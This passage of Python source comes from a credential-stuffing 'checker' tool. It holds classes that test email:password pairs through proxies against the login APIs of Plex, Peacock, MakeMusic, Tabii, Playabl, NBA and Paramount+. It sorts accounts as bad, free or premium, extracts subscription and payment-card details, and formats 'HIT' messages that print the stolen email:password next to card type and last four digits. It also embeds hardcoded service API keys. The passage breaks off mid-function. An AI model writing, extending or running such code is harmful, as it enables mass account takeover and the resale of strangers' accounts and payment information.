            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) Chrome/139.0.0.0 Mobile Safari/537.36',
            'Origin': 'https://watch.plex.tv',
            'Referer': 'https://watch.plex.tv/',
            'Accept': 'application/json',
        }
        payload = {'login': email, 'password': password, 'rememberMe': True}
        resp = session.post('https://plex.tv/api/v2/users/signin', headers=headers, json=payload, timeout=self.timeout)
        if resp.status_code == 201:
            data = resp.json()
            token = data.get('authToken') or data.get('authentication_token')
            sub = data.get('subscription') or {}
            plan = sub.get('plan') or 'Free'
            status_text = sub.get('status', 'Unknown')
            expires = sub.get('expires_at', 'N/A')
            country = data.get('country', 'N/A')
            is_premium = bool(plan and plan != "Free" and str(status_text).lower() == "active")
            return {
                "status": "premium" if is_premium else "free",
                "plan": plan,
                "status_text": status_text,
                "expires_at": expires,
                "country": country,
                "token": (token or '')[:12] + '...' if token else 'N/A',
                "message": f"Plan: {plan} | Status: {status_text} | Country: {format_country(country)} | Exp: {expires}",
            }
        if resp.status_code == 401:
            return {"status": "bad", "message": "Invalid credentials"}
        if resp.status_code == 429:
            return {"status": "error", "message": "Rate limited"}
        return {"status": "error", "message": f"HTTP {resp.status_code}"}

# ----- 15. Peacock Checker -----
class PeacockChecker:
    def __init__(self, proxy=None, timeout=12):
        self.proxy = proxy
        self.timeout = timeout
        self.android_ua = (
            "PeacockAndroid-US/Mozilla/5.0 (Linux; Android 10; K) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"
        )

    def check(self, email: str, password: str, proxy=None) -> Dict:
        proxy = proxy or self.proxy
        max_retries = 1
        for attempt in range(max_retries):
            try:
                return self._check_internal(email, password, proxy)
            except Exception as e:
                if attempt == max_retries - 1:
                    return {"status": "error", "message": str(e)[:80]}
                pass
        return {"status": "error", "message": "Max retries"}

    def _check_internal(self, email, password, proxy):
        session = requests.Session()
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        url = (
            "https://rango.id.peacocktv.com/signin/service/international"
            "?continuationUrl=https%3A%2F%2Frango.id.peacocktv.com%2Foauth%2Fauthorize"
            "%2Fservice%2Finternational%3Fresponse_type%3Dtoken"
            "%26client_id%3Dnbcu_iphone%26redirect_uri%3Dnbcu%3A%2F%2Fauth"
            "%26api_id%3Doauth"
        )
        headers = {
            'accept': 'application/vnd.siren+json',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': self.android_ua,
            'x-skyott-proposition': 'NBCUOTT',
            'x-skyott-provider': 'NBCU',
            'x-skyott-territory': 'US',
        }
        body = f"userIdentifier={urlparse.quote(email)}&password={urlparse.quote(password)}"
        r = session.post(url, data=body, headers=headers, timeout=self.timeout, allow_redirects=False)
        text = r.text or ''
        if r.status_code == 422 or '"eventType":"error"' in text:
            return {"status": "bad", "message": "Invalid credentials"}
        if r.status_code == 429:
            return {"status": "error", "message": "Rate limited"}
        if r.status_code not in (200, 201) or '"eventType":"success"' not in text:
            return {"status": "error", "message": f"HTTP {r.status_code}"}
        return {
            "status": "valid",
            "message": "Login successful",
            "country": "US",
        }

# ----- 16. MakeMusic Checker -----
class MakeMusicChecker:
    def __init__(self, proxy=None, timeout=12):
        self.proxy = proxy
        self.timeout = timeout

    def check(self, email: str, password: str, proxy=None) -> Dict:
        proxy = proxy or self.proxy
        max_retries = 1
        for attempt in range(max_retries):
            try:
                return self._check_internal(email, password, proxy)
            except Exception as e:
                if attempt == max_retries - 1:
                    return {"status": "error", "message": str(e)[:80]}
                pass
        return {"status": "error", "message": "Max retries"}

    def _check_internal(self, email, password, proxy):
        session = requests.Session()
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        session.headers.update({
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        })
        login_url = "https://auth.makemusic.com/identity/account/login"
        params = {"returnUrl": "https://home.makemusic.com/"}
        resp = session.get(login_url, params=params, timeout=self.timeout)
        if resp.status_code != 200:
            return {"status": "error", "message": f"GET login failed: {resp.status_code}"}
        m = re.search(r'name="__RequestVerificationToken"[^>]*value="([^"]+)"', resp.text)
        if not m:
            return {"status": "error", "message": "CSRF token not found"}
        csrf = m.group(1)
        data = {
            "ReturnUrl": "https://home.makemusic.com/",
            "Username": email,
            "Password": password,
            "button": "login",
            "__RequestVerificationToken": csrf,
        }
        post_headers = {
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://auth.makemusic.com',
            'referer': login_url + '?returnUrl=https%3A%2F%2Fhome.makemusic.com%2F',
        }
        post_resp = session.post(login_url, params=params, data=data, headers=post_headers,
                                 timeout=self.timeout, allow_redirects=True)
        if post_resp.status_code == 200 and ('incorrect' in post_resp.text.lower() or 'invalid' in post_resp.text.lower()):
            return {"status": "bad", "message": "Invalid credentials"}
        if post_resp.status_code == 401:
            return {"status": "bad", "message": "Invalid credentials"}
        if post_resp.status_code >= 400:
            return {"status": "error", "message": f"HTTP {post_resp.status_code}"}
        return {"status": "valid", "message": "Login successful", "country": ""}

# ----- 17. Tabii Checker -----
class TabiiChecker:
    def __init__(self, proxy=None, timeout=12):
        self.proxy = proxy
        self.timeout = timeout
        self.device_id = f"{int(time.time()*1000)}_{random.randint(100000,999999)}"

    def check(self, email: str, password: str, proxy=None) -> Dict:
        proxy = proxy or self.proxy
        max_retries = 1
        for attempt in range(max_retries):
            try:
                return self._check_internal(email, password, proxy)
            except Exception as e:
                if attempt == max_retries - 1:
                    return {"status": "error", "message": str(e)[:80]}
                pass
        return {"status": "error", "message": "Max retries"}

    def _build_headers(self, token=None):
        headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'device-id': self.device_id,
            'device-language': 'en-IN',
            'device-os-name': 'Android',
            'device-os-version': '10',
            'origin': 'https://www.tabii.com',
            'platform': 'Web-Mobile',
            'referer': 'https://www.tabii.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'x-country-code': 'US',
        }
        if token:
            headers['Authorization'] = f'Bearer {token}'
        return headers

    def _check_internal(self, email, password, proxy):
        session = requests.Session()
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        url = "https://eu1.tabii.com/apigateway/auth/v2/login"
        payload = {"email": email, "password": password, "remember": False}
        resp = session.post(url, json=payload, headers=self._build_headers(), timeout=self.timeout)
        if resp.status_code == 200:
            data = resp.json()
            token = data.get('accessToken')
            if not token:
                return {"status": "error", "message": "No token"}
            me = session.get("https://eu1.tabii.com/apigateway/auth/v2/me",
                             headers=self._build_headers(token), timeout=self.timeout)
            if me.status_code == 200:
                user = me.json()
                sub = user.get('subscription') or {}
                plan = sub.get('title', 'Free')
                if str(plan).lower() in ('ücretsiz', 'ucretsiz'):
                    plan = 'Free'
                status_text = sub.get('status', user.get('state', 'Unknown'))
                country = user.get('subscriptionCountryCode', 'N/A')
                is_premium = str(status_text).lower() == 'active' and plan.lower() != 'free'
                return {
                    "status": "premium" if is_premium else "free",
                    "plan": plan,
                    "status_text": status_text,
                    "country": country,
                    "name": user.get('name', 'N/A'),
                    "message": f"Plan: {plan} | Status: {status_text} | Country: {format_country(country)}",
                }
            return {"status": "free", "message": "Login ok, no profile", "country": ""}
        if resp.status_code in (400, 401):
            return {"status": "bad", "message": "Invalid credentials"}
        if resp.status_code == 403:
            return {"status": "bad", "message": "Blocked/region locked"}
        if resp.status_code == 429:
            return {"status": "error", "message": "Rate limited"}
        return {"status": "error", "message": f"HTTP {resp.status_code}"}

# ----- 18. Playabl Checker -----
class PlayablChecker:
    def __init__(self, proxy=None, timeout=12):
        self.proxy = proxy
        self.timeout = timeout

    def check(self, email: str, password: str, proxy=None) -> Dict:
        proxy = proxy or self.proxy
        max_retries = 1
        for attempt in range(max_retries):
            try:
                return self._check_internal(email, password, proxy)
            except Exception as e:
                if attempt == max_retries - 1:
                    return {"status": "error", "message": str(e)[:80]}
                pass
        return {"status": "error", "message": "Max retries"}

    def _check_internal(self, email, password, proxy):
        session = requests.Session()
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'origin': 'https://playabl.ai',
            'referer': 'https://playabl.ai/en/auth/login',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        resp = session.post("https://playabl.ai/api/v1/authentication/signin",
                            json={"email": email, "password": password},
                            headers=headers, timeout=self.timeout)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('error') or data.get('errors'):
                err = data.get('error') or data.get('errors')
                return {"status": "bad", "message": str(err)}
            user = data.get('data') or data
            return {
                "status": "valid",
                "username": user.get('username') or user.get('fullName'),
                "id": user.get('id'),
                "message": f"ID: {user.get('id')} | User: {user.get('username', 'N/A')}",
                "country": user.get('country', ''),
            }
        if resp.status_code == 401:
            return {"status": "bad", "message": "Invalid credentials"}
        return {"status": "error", "message": f"HTTP {resp.status_code}"}


# ----- 12. Multi-Checker: runs all checkers on each combo (Premium only) -----

# =============================================================================
# NBA Checker (ported from NBA TV tool — credit retagged to @samvir1)
# =============================================================================
NBA_CLIENT_ID = "d3S9lWRVmuunNhQ5_0xnyHB-Q3gpEXCrCmdgePkELTw"
NBA_USER_AGENT = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"
NBA_NEWRELIC_ID = "VwcFU1BTCRABVlZRBAgDX1cG"
NBA_PAYMENT_KEY = "a08524b6b2cfb31633344639fe7f482cfbd216ccc135dcdb263cbb3b3a25c9970a444685dfa94d7876e66162347725d19c651639b1584a33d9256037485141f4"
NBA_AUTHOR = "@samvir1"


def _nba_ts_to_date(ms):
    if not ms:
        return "N/A"
    try:
        return datetime.fromtimestamp(int(ms) / 1000, timezone.utc).strftime("%Y-%m-%d")
    except Exception:
        return "N/A"


def _nba_format_proxy(proxy):
    if not proxy:
        return None
    proxy = str(proxy).strip()
    if proxy.startswith("http"):
        return proxy
    parts = proxy.split(":")
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if "@" in proxy:
        return f"http://{proxy}"
    return f"http://{proxy}"


class NBAChecker:
    """NBA identity.nba.com login + optional payment/subscription enrichment."""

    def __init__(self, proxy=None):
        self.proxy = _nba_format_proxy(proxy) if proxy else None
        self.timeout = 25
        try:
            from curl_cffi import requests as cffi_requests
            self.session = make_session(impersonate="chrome")
            self._use_cffi = True
        except Exception:
            self.session = requests.Session()
            self._use_cffi = False

    def _proxies(self):
        if not self.proxy:
            return None
        return {"http": self.proxy, "https": self.proxy}

    def _login_headers(self):
        return {
            "accept": "application/json",
            "accept-encoding": "gzip",
            "connection": "Keep-Alive",
            "content-type": "application/json; charset=UTF-8",
            "host": "identity.nba.com",
            "user-agent": NBA_USER_AGENT,
            "x-client-id": NBA_CLIENT_ID,
            "X-NewRelic-ID": NBA_NEWRELIC_ID,
        }

    def _post(self, url, **kwargs):
        kwargs.setdefault("timeout", self.timeout)
        kwargs.setdefault("proxies", self._proxies())
        if self._use_cffi:
            return self.session.post(url, **kwargs)
        return self.session.post(url, **kwargs)

    def _get(self, url, **kwargs):
        kwargs.setdefault("timeout", self.timeout)
        kwargs.setdefault("proxies", self._proxies())
        if self._use_cffi:
            return self.session.get(url, **kwargs)
        return self.session.get(url, **kwargs)

    def _login(self, email, password):
        url = "https://identity.nba.com/api/v1/auth?"
        payload = {"email": email, "password": password, "rememberMe": False}
        headers = self._login_headers()
        try:
            r = self._post(url, json=payload, headers=headers)
        except Exception as e:
            msg = str(e).lower()
            if "timeout" in msg:
                return {"status": "error", "message": "timeout"}
            if "proxy" in msg:
                return {"status": "error", "message": "proxy error"}
            return {"status": "error", "message": str(e)[:100]}

        text = r.text or ""
        low = text.lower()
        if r.status_code == 403 and ("access denied" in low or "edgesuite" in low or "<html" in low):
            return {"status": "error", "message": "akamai block"}
        if r.status_code == 429:
            return {"status": "error", "message": "rate_limit"}
        if r.status_code in (401, 403):
            return {"status": "bad", "message": "Invalid credentials"}
        if r.status_code in (502, 504):
            return {"status": "error", "message": f"gateway {r.status_code}"}
        if r.status_code not in (200, 201):
            return {"status": "error", "message": f"HTTP {r.status_code}"}

        try:
            body = r.json()
        except Exception:
            return {"status": "error", "message": "bad json"}

        # credentials wrong shapes
        if body.get("error") or body.get("errors"):
            err = body.get("error") or body.get("errors")
            return {"status": "bad", "message": str(err)[:80]}

        user = {
            "email": email,
            "given_name": body.get("firstName") or body.get("given_name") or body.get("first_name") or "N/A",
            "family_name": body.get("lastName") or body.get("family_name") or body.get("last_name") or "N/A",
            "dob": body.get("dob") or body.get("dateOfBirth") or "N/A",
            "membership_id": body.get("membershipId") or body.get("membership_id") or "N/A",
            "evergent_id": body.get("evergentId") or body.get("evergent_id") or "N/A",
            "country": body.get("country") or body.get("countryCode") or "N/A",
        }
        jwt = (
            body.get("accessToken")
            or body.get("access_token")
            or body.get("token")
            or body.get("idToken")
            or ""
        )
        if not jwt and isinstance(body.get("data"), dict):
            data = body["data"]
            jwt = data.get("accessToken") or data.get("access_token") or data.get("token") or ""
            for k, v in data.items():
                if k not in user or user[k] in ("N/A", "", None):
                    if isinstance(v, (str, int, float, bool)):
                        user[k] = v

        user["jwt"] = jwt
        if not jwt:
            # still valid login sometimes without jwt for profile-only
            return {
                "status": "valid",
                "message": "Login OK",
                "plan": "Login OK",
                "country": user.get("country", "N/A"),
                "user": user.get("given_name", "N/A"),
                "checked_by": NBA_AUTHOR,
            }

        # optional subscription enrich
        try:
            sub = self._fetch_subscription(jwt)
        except Exception:
            sub = None
        if sub:
            user.update(sub)

        plan = user.get("plan") or "Login OK"
        status_out = "premium" if user.get("has_subscription") or user.get("league_pass") else "valid"
        out = {
            "status": status_out,
            "message": "Login successful" if status_out == "valid" else "League Pass / Active sub",
            "plan": plan,
            "streams": user.get("sub_count", "N/A"),
            "next_billing": user.get("next_payment", "N/A"),
            "next_payment": user.get("next_payment", "N/A"),
            "auto_renew": user.get("renewal_bool", "N/A"),
            "renewal_bool": user.get("renewal_bool", "N/A"),
            "expires": user.get("expires", "N/A"),
            "start_date": user.get("start_date", "N/A"),
            "country": user.get("country", "N/A"),
            "payment": user.get("payment_type", user.get("payment", "N/A")),
            "payment_type": user.get("payment_type", user.get("payment", "N/A")),
            "plan_base": user.get("sku", "N/A"),
            "sku": user.get("sku", "N/A"),
            "price": user.get("price", "N/A"),
            "sub_status": user.get("sub_status", status_out),
            "user": (str(user.get("given_name", "")) + " " + str(user.get("family_name", ""))).strip() or "N/A",
            "verified": "N/A",
            "league_pass": "Yes" if user.get("league_pass") else "No",
            "card_type": user.get("card_type", "N/A"),
            "card_last4": user.get("card_last4", "N/A"),
            "card_expiry": user.get("card_expiry", "N/A"),
            "checked_by": NBA_AUTHOR,
        }
        out["hit_text"] = (
            f"{E('success')} <b>HIT</b> - NBA {E('gem')}\n\n"
            f"<b>Account</b> ➜ <code>{email}:{password}</code>\n"
            f"<b>subscriptionStatus</b> = {out.get('sub_status')}\n"
            f"<b>Subscription Name</b> = {out.get('plan')}\n"
            f"<b>Price</b> = {out.get('price')}\n"
            f"<b>Renowal</b> = {out.get('renewal_bool')}\n"
            f"<b>StartDate</b> = {out.get('start_date')}\n"
            f"<b>Next Payement</b> = {out.get('next_payment')}\n"
            f"<b>Payement Method</b> = {out.get('payment')}\n"
            f"<b>cardType</b> = {out.get('card_type')}\n"
            f"<b>Last 4</b> = {out.get('card_last4')}\n"
            f"<b>ExpiryDate</b> = {out.get('expires')}\n"
            f"<b>Country</b> = {out.get('country')}\n"
            f"<b>LP</b> = {out.get('league_pass')}\n\n"
            f"<b>Made By</b> ➜ {NBA_AUTHOR}"
        )
        return out

    def _fetch_subscription(self, jwt):
        # Best-effort payment.nba.com style enrichment; never crash checker
        headers = {
            "accept": "application/json",
            "authorization": f"Bearer {jwt}",
            "user-agent": NBA_USER_AGENT,
            "x-client-id": NBA_CLIENT_ID,
        }
        out = {}
        try:
            # profile
            r = self._get("https://identity.nba.com/api/v1/profile", headers=headers)
            if r.status_code in (200, 201):
                try:
                    p = r.json()
                    if isinstance(p, dict):
                        out["given_name"] = p.get("firstName") or p.get("given_name") or out.get("given_name", "N/A")
                        out["family_name"] = p.get("lastName") or p.get("family_name") or out.get("family_name", "N/A")
                        out["country"] = p.get("country") or p.get("countryCode") or out.get("country", "N/A")
                except Exception:
                    pass
        except Exception:
            pass
        try:
            # subscription proxy endpoint (may change; tolerate failure)
            r = self._get(
                "https://payment.nba.com/proxy/subscription",
                headers={
                    **headers,
                    "x-api-key": NBA_PAYMENT_KEY[:32] if NBA_PAYMENT_KEY else "",
                },
            )
            if r.status_code in (200, 201):
                data = r.json() if r.text else {}
                acct = (data.get("account") or {}) if isinstance(data, dict) else {}
                pay = (data.get("payment") or {}) if isinstance(data, dict) else {}
                subs = (data.get("subs") or data.get("subscriptions") or []) if isinstance(data, dict) else []
                if pay.get("type"):
                    out["payment"] = pay["type"]
                    out["payment_type"] = pay["type"]
                if pay.get("card_type"):
                    out["card_type"] = pay["card_type"]
                if pay.get("card_number"):
                    cn = str(pay["card_number"])
                    out["card_last4"] = cn[-4:] if len(cn) >= 4 else cn
                out["sub_count"] = len(subs) if isinstance(subs, list) else 0
                if isinstance(subs, list) and subs:
                    s = subs[0]
                    out["has_subscription"] = True
                    out["plan"] = s.get("displayName") or s.get("serviceName") or "N/A"
                    out["sub_status"] = s.get("subscriptionStatus") or s.get("status") or "N/A"
                    out["sku"] = s.get("serviceID") or "N/A"
                    out["country"] = s.get("orderCountry") or out.get("country", "N/A")
                    out["next_payment"] = _nba_ts_to_date(s.get("nextBillingDateTime") or s.get("validityTill"))
                    out["expires"] = _nba_ts_to_date(s.get("validityTill"))
                    out["renewal_bool"] = "true" if s.get("isRenewal") else "false"
                    attrs = {
                        a.get("attributeName"): a.get("attributeValue")
                        for a in (s.get("productAttributes") or [])
                        if isinstance(a, dict)
                    }
                    out["league_pass"] = attrs.get("IsLPSubscription") == "Yes" or "BLP" in str(out.get("sku", "")).upper()
        except Exception:
            pass
        return out

    def check(self, email, password, proxy=None):
        if proxy:
            self.proxy = _nba_format_proxy(proxy)
        try:
            return self._login(email, password)
        except Exception as e:
            return {"status": "error", "message": str(e)[:100]}




# =============================================================================
# Paramount+ Checker (ported — credit @samvir1)
# =============================================================================
PARAMOUNT_BASE = "https://www.paramountplus.com"
PARAMOUNT_AUTHOR = "@samvir1"
DEBUG = False
PARAMOUNT_UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"

COMMON_HEADERS = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': PARAMOUNT_UA,
    'x-requested-with': 'XMLHttpRequest',
}



def _walk_json(obj, path=""):
    if isinstance(obj, dict):
        for k, v in obj.items():
            new_path = f"{path}.{k}" if path else k
            yield new_path, v
            yield from _walk_json(v, new_path)
    elif isinstance(obj, list):
        for i, item in enumerate(obj):
            yield from _walk_json(item, f"{path}[{i}]")


_DATE_KEY_HINTS = (
    'expire', 'expiry', 'expiration', 'end_date', 'enddate', 'ends_at',
    'next_bill', 'nextbill', 'renew', 'renewal', 'valid_until', 'validuntil',
    'period_end', 'current_period_end', 'periodend', 'cancel_at', 'cancelat',
    'trial_end', 'trialend',
)


def _parse_date_value(v):
    if v is None or v == "":
        return None
    if isinstance(v, (int, float)) and v > 1000000000:
        try:
            return datetime.fromtimestamp(v / 1000 if v > 1e12 else v).strftime('%Y-%m-%d')
        except Exception:
            return None
    if isinstance(v, str):
        s = v.strip()
        if not s or s.lower() in ('null', 'none', 'false', 'true'):
            return None
        m = re.match(r'^(\d{4})-(\d{2})-(\d{2})', s)
        if m:
            return f"{m.group(1)}-{m.group(2)}-{m.group(3)}"
        m = re.match(r'^(\d{4})/(\d{2})/(\d{2})', s)
        if m:
            return f"{m.group(1)}-{m.group(2)}-{m.group(3)}"
        m = re.match(r'^(\d{2})/(\d{2})/(\d{4})', s)
        if m:
            return f"{m.group(3)}-{m.group(2)}-{m.group(1)}"
    return None


def _hunt_plan_end(*sources):
    candidates = []
    for src in sources:
        if not src:
            continue
        for path, value in _walk_json(src):
            lpath = path.lower()
            if any(h in lpath for h in _DATE_KEY_HINTS):
                parsed = _parse_date_value(value)
                if parsed:
                    depth = lpath.count('.')
                    priority = 0
                    for weight_key in ('next', 'renew', 'expire', 'end', 'period'):
                        if weight_key in lpath:
                            priority -= 1
                    candidates.append((priority, depth, parsed, path))
    if not candidates:
        return None, None
    candidates.sort(key=lambda x: (x[0], x[1]))
    return candidates[0][2], candidates[0][3]


def _hunt_price(*sources):
    for src in sources:
        if not src:
            continue
        for path, value in _walk_json(src):
            lpath = path.lower()
            if any(k in lpath for k in ('amount', 'price', 'cost', 'charge', 'fee')):
                if isinstance(value, (int, float)) and value > 0:
                    return str(value)
                if isinstance(value, str):
                    try:
                        f = float(value)
                        if f > 0:
                            return f"{f:.2f}"
                    except Exception:
                        pass
    return None


def _hunt_currency(*sources):
    for src in sources:
        if not src:
            continue
        for path, value in _walk_json(src):
            lpath = path.lower()
            if 'currency' in lpath and isinstance(value, str):
                v = value.strip().upper()
                if 2 <= len(v) <= 4 and v.isalpha():
                    return v
    return None



def _build_multipart(fields, boundary):
    parts = []
    for name, value in fields.items():
        parts.append(f"--{boundary}\r\n")
        parts.append(f'Content-Disposition: form-data; name="{name}"\r\n\r\n')
        parts.append(f"{value}\r\n")
    parts.append(f"--{boundary}--\r\n")
    return "".join(parts).encode("utf-8")


def _rand_boundary():
    return "----WebKitFormBoundary" + "".join(
        random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
        for _ in range(16)
    )




class _ParamountCore:
    def __init__(self):
        pass
        self.session = make_session(impersonate="chrome")


    def _extract_tk_trp(self, html: str):
        """Aggressive tk_trp extraction for Paramount+ sign-in HTML/JS."""
        if not html:
            return None
        patterns = [
            r'name=["\']tk_trp["\'][^>]*value=["\']([^"\']+)["\']',
            r'value=["\']([^"\']+)["\'][^>]*name=["\']tk_trp["\']',
            r'name=["\']tk_trp["\']\s*value=["\']([^"\']+)["\']',
            r'"tk_trp"\s*:\s*"([^"]+)"',
            r"'tk_trp'\s*:\s*'([^']+)'",
            r'tk_trp["\']?\s*[:=]\s*["\']([^"\']{16,})["\']',
            r'data-tk[_-]?trp=["\']([^"\']+)["\']',
            r'tkTrp["\']?\s*[:=]\s*["\']([^"\']{16,})["\']',
            r'["\']tkTrp["\']\s*:\s*["\']([^"\']+)["\']',
            r'name=["\']csrf[^"\']*["\'][^>]*value=["\']([^"\']+)["\']',
            r'name=["\'][_]?token["\'][^>]*value=["\']([^"\']+)["\']',
            r'<input[^>]+type=["\']hidden["\'][^>]+name=["\']tk_trp["\'][^>]+value=["\']([^"\']+)["\']',
            r'<input[^>]+name=["\']tk_trp["\'][^>]+type=["\']hidden["\'][^>]+value=["\']([^"\']+)["\']',
        ]
        for pat in patterns:
            m = re.search(pat, html, re.I | re.S)
            if m:
                val = (m.group(1) or "").strip()
                if len(val) >= 8:
                    return val
        # last resort: any hidden input near tk_trp substring
        idx = html.lower().find("tk_trp")
        if idx >= 0:
            window = html[max(0, idx - 200): idx + 400]
            m = re.search(r'value=["\']([^"\']{12,})["\']', window, re.I)
            if m:
                return m.group(1).strip()
        return None

    def _get_signin(self, proxy=None):
        """Fetch sign-in page and extract tk_trp. Tries multiple locales/endpoints."""
        proxy_dict = {"http": proxy, "https": proxy} if proxy else None
        headers_doc = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": PARAMOUNT_UA,
        }
        urls = [
            f"{PARAMOUNT_BASE}/account/signin/",
            f"{PARAMOUNT_BASE}/account/signin/?flow=sign-in",
            f"{PARAMOUNT_BASE}/account/xhr/login/",  # sometimes redirects/cookies only
            f"{PARAMOUNT_BASE}/",
            "https://www.paramountplus.com/gb/account/signin/",
            "https://www.paramountplus.com/ca/account/signin/",
            "https://www.paramountplus.com/au/account/signin/",
        ]
        last_err = "no_tk_trp"
        last_resp = None
        # warm homepage first for cookies (helps some regions)
        try:
            self.session.get(
                f"{PARAMOUNT_BASE}/",
                headers=headers_doc,
                proxies=proxy_dict,
                timeout=30,
                allow_redirects=True,
            )
        except Exception:
            pass

        for url in urls:
            try:
                r = self.session.get(
                    url,
                    headers=headers_doc,
                    proxies=proxy_dict,
                    timeout=30,
                    allow_redirects=True,
                )
            except Exception as e:
                msg = str(e).lower()
                if "timeout" in msg:
                    last_err = "timeout"
                elif "proxy" in msg:
                    last_err = "proxy"
                else:
                    last_err = str(e)[:60]
                continue

            last_resp = r
            if r.status_code == 403:
                last_err = "block"
                continue
            if r.status_code == 429:
                last_err = "rate_limit"
                continue
            if r.status_code not in (200, 201):
                last_err = f"http_{r.status_code}"
                continue

            html = r.text or ""
            # soft size check — SPA pages can be smaller than 50k
            if len(html) < 500 and r.status_code == 200:
                last_err = "block"
                continue

            tk = self._extract_tk_trp(html)
            if tk:
                return r, tk, None

            # sometimes token only in cookies / set-cookie style names
            try:
                for cname, cval in dict(getattr(r, "cookies", {}) or {}).items():
                    if "trp" in cname.lower() or "csrf" in cname.lower() or "token" in cname.lower():
                        if cval and len(str(cval)) >= 8:
                            return r, str(cval), None
            except Exception:
                pass

            last_err = "no_tk_trp"

        # Final attempt: POST-less form bootstrap via xhr endpoint cookies
        try:
            r = self.session.get(
                f"{PARAMOUNT_BASE}/account/signin/",
                headers={**headers_doc, "sec-fetch-site": "same-origin", "referer": f"{PARAMOUNT_BASE}/"},
                proxies=proxy_dict,
                timeout=30,
            )
            last_resp = r
            tk = self._extract_tk_trp(r.text or "")
            if tk:
                return r, tk, None
            if r.status_code == 403:
                last_err = "block"
        except Exception as e:
            last_err = str(e)[:60]

        return last_resp, None, last_err


    def _post_login(self, email, password, tk_trp, proxy=None):
        boundary = _rand_boundary()
        fields = {
            "email": email,
            "password": password,
            "tk_trp": tk_trp,
            "recaptchaAction": "FORM_SIGN_IN",
            "recaptchaPartner": "PPLUS",
        }
        body = _build_multipart(fields, boundary)

        try:
            r = self.session.post(
                f"{PARAMOUNT_BASE}/account/xhr/login/",
                data=body,
                headers={
                    **COMMON_HEADERS,
                    'content-type': f'multipart/form-data; boundary={boundary}',
                    'content-length': str(len(body)),
                    'origin': PARAMOUNT_BASE,
                    'referer': f'{PARAMOUNT_BASE}/account/signin/',
                },
                proxies={"http": proxy, "https": proxy} if proxy else None,
                timeout=30,
            )
        except requests.exceptions.Timeout:
            return None, "timeout"
        except requests.exceptions.ProxyError:
            return None, "proxy"
        except requests.exceptions.ConnectionError:
            return None, "proxy"
        except Exception as e:
            return None, str(e)[:80]

        if r.status_code == 429:
            return None, "rate_limit"
        if r.status_code == 403:
            return None, "block"
        if r.status_code not in (200, 201):
            return None, f"http_{r.status_code}"

        try:
            body_json = r.json()
        except Exception:
            return None, "parse"

        if not body_json.get("success"):
            msg = body_json.get("error") or body_json.get("message") or "Login failed"
            return {"bad": True, "message": str(msg)[:120]}, None

        return {"bad": False, "data": body_json}, None

    def _fetch_billing(self, proxy=None):
        try:
            r = self.session.get(
                f"{PARAMOUNT_BASE}/account/xhr/fetch-billing-data/",
                headers={**COMMON_HEADERS, 'referer': f'{PARAMOUNT_BASE}/account/'},
                proxies={"http": proxy, "https": proxy} if proxy else None,
                timeout=30,
            )
            if r.status_code == 200:
                return r.json()
        except Exception:
            pass
        return None

    def _fetch_subs(self, proxy=None):
        try:
            r = self.session.get(
                f"{PARAMOUNT_BASE}/account/xhr/fetch-subscription-data/",
                headers={**COMMON_HEADERS, 'referer': f'{PARAMOUNT_BASE}/account/'},
                proxies={"http": proxy, "https": proxy} if proxy else None,
                timeout=30,
            )
            if r.status_code == 200:
                return r.json()
        except Exception:
            pass
        return None

    def check(self, email, password, proxy=None):
        pass

        _, tk_trp, err = self._get_signin(proxy)
        if err:
            return {"status": "error", "error_type": err, "message": f"signin: {err}"}

        login_result, err = self._post_login(email, password, tk_trp, proxy)
        if err:
            return {"status": "error", "error_type": err, "message": f"login: {err}"}
        if login_result.get("bad"):
            return {"status": "bad", "error_type": "creds",
                    "message": login_result["message"]}

        body = login_result["data"]
        user = body.get("user") or {}
        profile = user.get("profile") or {}
        svod = user.get("svod") or {}
        packages = svod.get("packages") or []
        pkg = packages[0] if packages else {}
        entitlement = user.get("entitlement") or {}

        billing = self._fetch_billing(proxy) or {}
        billing_info = (billing.get("result") or {}).get("billingInfo") or {}

